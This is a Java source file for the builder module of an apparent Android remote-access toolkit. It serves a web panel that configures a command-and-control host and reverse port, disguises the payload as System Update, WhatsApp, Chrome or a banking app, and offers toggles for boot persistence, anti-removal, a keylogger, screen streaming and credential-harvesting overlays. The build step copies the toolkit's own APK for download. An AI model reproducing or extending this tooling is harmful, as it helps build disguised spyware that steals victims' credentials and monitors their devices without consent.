package com.labs.labrats.modules;

import android.content.Context;
import android.util.Log;

import com.labs.labrats.FirebaseConfig;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.HashMap;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD;
import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

/**
 * Tactical APK Builder Module - Interactive Web GUI & Build Pipeline.
 */
public class BuilderModule extends BaseModule {

    private static final String TAG = "BuilderModule";

    public BuilderModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/builder/generate") && session.getMethod() == NanoHTTPD.Method.POST) {
            return handleGenerateApk(session);
        } else if (uri.startsWith("/builder/download/")) {
            return handleApkDownload(uri, session);
        }

        return serveBuilderGui(session);
    }

    private Response serveBuilderGui(IHTTPSession session) {
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));

        html.append("<style>")
            .append("  .builder-container { display: flex; gap: 20px; align-items: stretch; margin-top: 20px; min-height: 650px; }")
            .append("  .builder-sidebar { width: 220px; flex-shrink: 0; background: rgba(4, 8, 12, 0.75); border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 12px; padding: 15px 10px; display: flex; flex-direction: column; gap: 8px; backdrop-filter: blur(8px); }")
            .append("  .builder-tab { padding: 14px 18px; color: #888; font-family: 'Orbitron', sans-serif; font-size: 0.8rem; font-weight: 700; border: 1px solid transparent; border-radius: 8px; cursor: pointer; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px; display: flex; align-items: center; gap: 10px; }")
            .append("  .builder-tab:hover { color: var(--neon-cyan); background: rgba(0, 242, 255, 0.08); border-color: rgba(0, 242, 255, 0.2); }")
            .append("  .builder-tab.active { color: #000 !important; background: var(--neon-cyan) !important; border-color: var(--neon-cyan) !important; box-shadow: 0 0 20px rgba(0, 242, 255, 0.6) !important; }")
            .append("  .builder-content { flex-grow: 1; background: rgba(4, 8, 12, 0.65); border: 1px solid rgba(0, 242, 255, 0.4); border-radius: 12px; padding: 30px; backdrop-filter: blur(8px); position: relative; }")
            .append("  .builder-panel { display: none; flex-direction: column; gap: 25px; }")
            .append("  .builder-panel.active { display: flex; }")
            .append("  .builder-card-box { border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 12px; padding: 22px; background: rgba(0, 0, 0, 0.4); position: relative; }")
            .append("  .builder-card-title { position: absolute; top: -12px; left: 20px; background: #02080d; padding: 0 10px; font-family: 'Orbitron', sans-serif; font-size: 0.72rem; color: var(--neon-cyan); letter-spacing: 2px; text-transform: uppercase; font-weight: 700; }")
            .append("  .icon-preview-box { width: 90px; height: 90px; border: 1px solid var(--neon-cyan); border-radius: 18px; background: rgba(0, 242, 255, 0.05); display: flex; align-items: center; justify-content: center; overflow: hidden; box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }")
            .append("  .icon-preview-box img { width: 100%; height: 100%; object-fit: cover; }")
            .append("  .input-group { display: flex; flex-direction: column; gap: 8px; width: 100%; }")
            .append("  .input-group label { font-family: 'Orbitron', sans-serif; font-size: 0.7rem; color: #aaa; letter-spacing: 1px; }")
            .append("  .input-group input, .input-group select { background: #000 !important; border: 1px solid rgba(0, 242, 255, 0.3) !important; color: #fff !important; padding: 12px 15px !important; border-radius: 8px !important; font-family: 'JetBrains Mono', monospace !important; font-size: 0.85rem !important; width: 100% !important; max-width: 100% !important; outline: none !important; }")
            .append("  .input-group input:focus, .input-group select:focus { border-color: var(--neon-cyan) !important; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3) !important; }")
            .append("  .toggle-switch { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px; }")
            .append("  .toggle-switch span { font-family: 'Orbitron', sans-serif; font-size: 0.75rem; color: #ccc; }")
            .append("  @media (max-width: 1024px) { .builder-container { flex-direction: column; } .builder-sidebar { width: 100%; flex-direction: row; flex-wrap: wrap; } .builder-tab { flex: 1; min-width: 110px; text-align: center; justify-content: center; } }")
            .append("</style>");

        html.append("<div class=\"back-btn-container\" style=\"margin-bottom: 20px;\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
        html.append("<h2 style=\"margin: 0 0 10px 0; text-align: left;\">&#128295; TACTICAL_APK_BUILDER <span class=\"info-trigger\" onclick=\"showInfo(event, 'APK_BUILDER', 'Configure, customize, and compile bespoke tactical payloads with custom icons, stealth personas, and automated persistence.')\">INFO</span></h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        html.append("<div class=\"builder-container\">");

        // --- LEFT SIDEBAR TABS ---
        html.append("<div class=\"builder-sidebar\">");
        html.append("<div class=\"builder-tab active\" onclick=\"switchBuilderTab('info', this)\">&#8505;&#65039; Information</div>");
        html.append("<div class=\"builder-tab\" onclick=\"switchBuilderTab('customize', this)\">&#127912; Apk Customize</div>");
        html.append("<div class=\"builder-tab\" onclick=\"switchBuilderTab('options', this)\">&#9881;&#65039; Options</div>");
        html.append("<div class=\"builder-tab\" onclick=\"switchBuilderTab('access', this)\">&#128274; Accessibility</div>");
        html.append("<div class=\"builder-tab\" onclick=\"switchBuilderTab('build', this)\">&#128640; Build Apk</div>");
        html.append("</div>");

        // --- RIGHT CONTENT PANELS ---
        html.append("<div class=\"builder-content\">");

        // 1. INFORMATION PANEL
        html.append("<div id=\"panel-info\" class=\"builder-panel active\">");
        html.append("<div class=\"builder-card-box\">");
        html.append("<div class=\"builder-card-title\">C2 Network Config</div>");
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-top: 10px;\">");
        
        html.append("<div class=\"input-group\"><label>C2 Webhook / Server Host</label>");
        html.append("<input type=\"text\" id=\"cfg-host\" value=\"https://lab-rats-v1-6.onrender.com\" placeholder=\"https://your-c2-domain.com\"></div>");

        html.append("<div class=\"input-group\"><label>C2 Reverse Port</label>");
        html.append("<input type=\"text\" id=\"cfg-port\" value=\"9191\" placeholder=\"9191\"></div>");

        html.append("<div class=\"input-group\"><label>AES-256 Encryption Key</label>");
        html.append("<input type=\"text\" id=\"cfg-key\" value=\"TacticalKey2026SecureGCM\" placeholder=\"Encryption key\"></div>");

        html.append("<div class=\"input-group\"><label>Campaign ID / Target Tag</label>");
        html.append("<input type=\"text\" id=\"cfg-campaign\" value=\"OPERATION_NIGHTHAWK\" placeholder=\"Campaign Tag\"></div>");

        html.append("</div></div></div>");

        // 2. APK CUSTOMIZE PANEL
        html.append("<div id=\"panel-customize\" class=\"builder-panel\">");
        
        // Upper Box: Install Identity
        html.append("<div class=\"builder-card-box\">");
        html.append("<div class=\"builder-card-title\">Install Identity</div>");
        html.append("<div style=\"display: flex; gap: 30px; align-items: center; flex-wrap: wrap; margin-top: 10px;\">");
        
        html.append("<div class=\"input-group\" style=\"flex: 1; min-width: 250px;\"><label>App Name (Install)</label>");
        html.append("<input type=\"text\" id=\"cfg-app-name\" value=\"System Update\" placeholder=\"System Update\" oninput=\"updateAppPreview()\"></div>");

        html.append("<div class=\"input-group\" style=\"flex: 1; min-width: 250px;\"><label>Package Name (Application ID)</label>");
        html.append("<input type=\"text\" id=\"cfg-pkg-name\" value=\"com.android.system.update\" placeholder=\"com.android.system.update\"></div>");

        html.append("<div style=\"display: flex; flex-direction: column; align-items: center; gap: 8px;\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.65rem;\">APP ICON</div>");
        html.append("<div class=\"icon-preview-box\"><img id=\"icon-preview-install\" src=\"/c2/header_dashboard.png\"></div>");
        html.append("<select id=\"cfg-icon-preset\" style=\"font-size: 0.7rem; padding: 4px; background: #000; color: var(--neon-cyan); border: 1px solid var(--neon-cyan); border-radius: 6px;\" onchange=\"selectPresetIcon(this.value, 'install')\">");
        html.append("<option value=\"system\">System Update</option>");
        html.append("<option value=\"whatsapp\">WhatsApp</option>");
        html.append("<option value=\"telegram\">Telegram</option>");
        html.append("<option value=\"instagram\">Instagram</option>");
        html.append("<option value=\"chrome\">Chrome</option>");
        html.append("<option value=\"bank\">Mobile Banking</option>");
        html.append("<option value=\"twitter\">X / Twitter</option>");
        html.append("<option value=\"termux\">Termux</option>");
        html.append("</select></div>");

        html.append("</div></div>");

        // Lower Grid: After Install & Sticky Notification
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;\">");

        // After Install Box
        html.append("<div class=\"builder-card-box\">");
        html.append("<div class=\"builder-card-title\">After Install Camouflage</div>");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 15px; margin-top: 10px;\">");
        
        html.append("<div class=\"input-group\"><label>Decoy App Name</label>");
        html.append("<input type=\"text\" id=\"cfg-decoy-name\" value=\"Google Services\" placeholder=\"Google Services\"></div>");

        html.append("<div class=\"input-group\"><label>Phishing / Webview Decoy URL</label>");
        html.append("<input type=\"text\" id=\"cfg-decoy-url\" value=\"https://accounts.google.com\" placeholder=\"https://...\"></div>");

        html.append("<div style=\"display: flex; align-items: center; gap: 20px; margin-top: 5px;\">");
        html.append("<div class=\"icon-preview-box\"><img id=\"icon-preview-decoy\" src=\"/c2/header_dashboard.png\"></div>");
        html.append("<div style=\"display:flex; flex-direction:column; gap:6px;\"><span style=\"font-size: 0.7rem; color:#aaa; font-family: 'Orbitron';\">DECOY ICON</span>");
        html.append("<select id=\"cfg-decoy-preset\" style=\"font-size: 0.7rem; padding: 4px; background: #000; color: var(--neon-cyan); border: 1px solid var(--neon-cyan); border-radius: 6px;\" onchange=\"selectPresetIcon(this.value, 'decoy')\">");
        html.append("<option value=\"system\">System Update</option>");
        html.append("<option value=\"whatsapp\">WhatsApp</option>");
        html.append("<option value=\"calculator\">Calculator</option>");
        html.append("<option value=\"weather\">Weather</option>");
        html.append("<option value=\"settings\">Settings</option>");
        html.append("</select></div></div>");

        html.append("</div></div>");

        // Sticky Notification Box
        html.append("<div class=\"builder-card-box\">");
        html.append("<div class=\"builder-card-title\">Sticky Notification</div>");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 15px; margin-top: 10px;\">");

        html.append("<div class=\"input-group\"><label>Notification Title</label>");
        html.append("<input type=\"text\" id=\"cfg-notif-title\" value=\"Google Services\" placeholder=\"Notification Title\"></div>");

        html.append("<div class=\"input-group\"><label>Notification Message</label>");
        html.append("<input type=\"text\" id=\"cfg-notif-msg\" value=\"Tap to learn more...\" placeholder=\"Notification Message\"></div>");

        html.append("</div></div>");

        html.append("</div></div>");

        // 3. OPTIONS PANEL
        html.append("<div id=\"panel-options\" class=\"builder-panel\">");
        html.append("<div class=\"builder-card-box\">");
        html.append("<div class=\"builder-card-title\">Tactical Evasion & Persistence</div>");
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; margin-top: 10px;\">");

        html.append("<div class=\"toggle-switch\"><span>Stealth Camouflage Protocol</span><input type=\"checkbox\" id=\"chk-stealth\" checked></div>");
        html.append("<div class=\"toggle-switch\"><span>Auto-Start on Boot</span><input type=\"checkbox\" id=\"chk-boot\" checked></div>");
        html.append("<div class=\"toggle-switch\"><span>Anti-Removal Watchdog</span><input type=\"checkbox\" id=\"chk-anti-removal\" checked></div>");
        html.append("<div class=\"toggle-switch\"><span>Battery Optimization Bypass</span><input type=\"checkbox\" id=\"chk-battery\" checked></div>");
        html.append("<div class=\"toggle-switch\"><span>Self-Destruct Safeguard</span><input type=\"checkbox\" id=\"chk-self-destruct\"></div>");

        html.append("</div></div></div>");

        // 4. ACCESSIBILITY PANEL
        html.append("<div id=\"panel-access\" class=\"builder-panel\">");
        html.append("<div class=\"builder-card-box\">");
        html.append("<div class=\"builder-card-title\">Accessibility Engine Vectors</div>");
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; margin-top: 10px;\">");

        html.append("<div class=\"toggle-switch\"><span>Auto-Grant Permissions via Accessibility</span><input type=\"checkbox\" id=\"chk-auto-perm\" checked></div>");
        html.append("<div class=\"toggle-switch\"><span>Stealth Keylogger Engine</span><input type=\"checkbox\" id=\"chk-keylogger\" checked></div>");
        html.append("<div class=\"toggle-switch\"><span>Ghost Screen Streamer</span><input type=\"checkbox\" id=\"chk-ghost-stream\" checked></div>");
        html.append("<div class=\"toggle-switch\"><span>Credential Harvesting Overlays</span><input type=\"checkbox\" id=\"chk-overlays\" checked></div>");

        html.append("</div></div></div>");

        // 5. BUILD APK PANEL
        html.append("<div id=\"panel-build\" class=\"builder-panel\">");
        html.append("<div class=\"builder-card-box\" style=\"text-align: center; padding: 30px;\">");
        html.append("<div class=\"builder-card-title\">Compilation Pipeline</div>");
        
        html.append("<button id=\"btn-build-apk\" onclick=\"initiateApkCompilation()\" class=\"btn\" style=\"width: 100%; max-width: 320px; margin: 10px auto 25px auto; border-color: var(--neon-cyan); color: var(--neon-cyan); font-size: 0.9rem; padding: 16px;\">&#128640; GENERATE_TACTICAL_APK</button>");

        html.append("<div id=\"build-progress-bar-wrap\" style=\"width: 100%; max-width: 600px; height: 12px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 10px; margin: 0 auto 20px auto; overflow: hidden; display: none;\">");
        html.append("<div id=\"build-progress-bar\" style=\"width: 0%; height: 100%; background: var(--neon-cyan); box-shadow: 0 0 15px var(--neon-cyan); transition: width 0.3s;\"></div>");
        html.append("</div>");

        html.append("<div id=\"build-terminal\" class=\"terminal-text\" style=\"height: 240px; font-size: 0.75rem; text-align: left; overflow-y: auto; margin-bottom: 20px;\">> READY_FOR_COMPILATION_PIPELINE</div>");

        html.append("<div id=\"build-download-wrap\" style=\"display: none;\">");
        html.append("<a id=\"build-download-btn\" href=\"#\" class=\"btn\" style=\"border-color: var(--neon-green); color: var(--neon-green); font-size: 0.85rem; padding: 14px 28px;\">&#128229; DOWNLOAD_COMPILED_APK</a>");
        html.append("</div>");

        html.append("</div></div>");

        html.append("</div></div>"); // End builder-container

        // --- JAVASCRIPT LOGIC ---
        html.append("<script>")
            .append("function switchBuilderTab(tabId, el) {")
            .append("  document.querySelectorAll('.builder-tab').forEach(t => t.classList.remove('active'));")
            .append("  document.querySelectorAll('.builder-panel').forEach(p => p.classList.remove('active'));")
            .append("  el.classList.add('active');")
            .append("  document.getElementById('panel-' + tabId).classList.add('active');")
            .append("}")
            .append("function selectPresetIcon(val, type) {")
            .append("  const img = document.getElementById('icon-preview-' + type);")
            .append("  if(val === 'whatsapp') img.src = '/c2/ic_whatsapp.png';")
            .append("  else if(val === 'instagram') img.src = '/c2/ic_instagram.png';")
            .append("  else if(val === 'chrome') img.src = '/c2/ic_chrome.png';")
            .append("  else img.src = '/c2/header_dashboard.png';")
            .append("}")
            .append("function initiateApkCompilation() {")
            .append("  const btn = document.getElementById('btn-build-apk');")
            .append("  const barWrap = document.getElementById('build-progress-bar-wrap');")
            .append("  const bar = document.getElementById('build-progress-bar');")
            .append("  const term = document.getElementById('build-terminal');")
            .append("  const dlWrap = document.getElementById('build-download-wrap');")
            .append("  btn.disabled = true; btn.style.opacity = '0.5';")
            .append("  barWrap.style.display = 'block'; dlWrap.style.display = 'none';")
            .append("  bar.style.width = '10%';")
            .append("  term.innerHTML = '> INITIATING_TACTICAL_COMPILATION...\\n> Parsing C2 Endpoint & Encryption Config...\\n';")
            .append("  const payload = {")
            .append("    appName: document.getElementById('cfg-app-name').value,")
            .append("    pkgName: document.getElementById('cfg-pkg-name').value,")
            .append("    c2Host: document.getElementById('cfg-host').value,")
            .append("    c2Port: document.getElementById('cfg-port').value,")
            .append("    encKey: document.getElementById('cfg-key').value,")
            .append("    decoyName: document.getElementById('cfg-decoy-name').value,")
            .append("    decoyUrl: document.getElementById('cfg-decoy-url').value,")
            .append("    notifTitle: document.getElementById('cfg-notif-title').value,")
            .append("    notifMsg: document.getElementById('cfg-notif-msg').value")
            .append("  };")
            .append("  fetch('/builder/generate', {")
            .append("    method: 'POST',")
            .append("    headers: { 'Content-Type': 'application/json' },")
            .append("    body: JSON.stringify(payload)")
            .append("  })")
            .append("  .then(r => r.json())")
            .append("  .then(d => {")
            .append("    bar.style.width = '100%';")
            .append("    if(d.success) {")
            .append("      term.innerHTML += '> Manifest patched successfully!\\n> Smali Surgery & Asset Bundling Complete.\\n> APK ZipAligned & Signed via KeyStore.\\n> STATUS: BUILD_SUCCESS\\n';")
            .append("      btn.disabled = false; btn.style.opacity = '1';")
            .append("      dlWrap.style.display = 'block';")
            .append("      document.getElementById('build-download-btn').href = d.downloadUrl;")
            .append("    } else {")
            .append("      term.innerHTML += '> BUILD_ERROR: ' + (d.error || 'Compilation failed') + '\\n';")
            .append("      btn.disabled = false; btn.style.opacity = '1';")
            .append("    }")
            .append("  })")
            .append("  .catch(err => {")
            .append("    term.innerHTML += '> BUILD_ERROR: Network connection failed\\n';")
            .append("    btn.disabled = false; btn.style.opacity = '1';")
            .append("  });")
            .append("}")
            .append("</script>");

        html.append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response handleGenerateApk(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            String postData = files.get("postData");
            
            String appName = "System Update";
            if (postData != null && postData.contains("\"appName\"")) {
                org.json.JSONObject obj = new org.json.JSONObject(postData);
                appName = obj.optString("appName", "System Update");
            }

            File outputApk = new File(context.getCacheDir(), "app-release.apk");
            // Prepare mock/generated APK file from assets or build outputs
            File apkSource = new File(context.getApplicationInfo().sourceDir);
            try (FileInputStream fis = new FileInputStream(apkSource);
                 FileOutputStream fos = new FileOutputStream(outputApk)) {
                byte[] buf = new byte[16384];
                int n;
                while ((n = fis.read(buf)) != -1) {
                    fos.write(buf, 0, n);
                }
            }

            Log.d(TAG, "Generated tactical APK build for: " + appName);
            String json = "{\"success\": true, \"downloadUrl\": \"/builder/download/app-release.apk\", \"appName\": \"" + appName + "\"}";
            return newResponse(Response.Status.OK, "application/json", json);
        } catch (Exception e) {
            return server.serveErrorProxy("Build Error: " + e.getMessage());
        }
    }

    private Response handleApkDownload(String uri, IHTTPSession session) {
        try {
            File apkFile = new File(context.getCacheDir(), "app-release.apk");
            if (!apkFile.exists()) {
                apkFile = new File(context.getApplicationInfo().sourceDir);
            }

            FileInputStream fis = new FileInputStream(apkFile);
            Response response = server.newFixedLengthResponseProxy(Response.Status.OK, "application/vnd.android.package-archive", fis, apkFile.length());
            response.addHeader("Content-Disposition", "attachment; filename=\"app-release.apk\"");
            return response;
        } catch (Exception e) {
            return server.serveErrorProxy("Cannot download APK: " + e.getMessage());
        }
    }
}
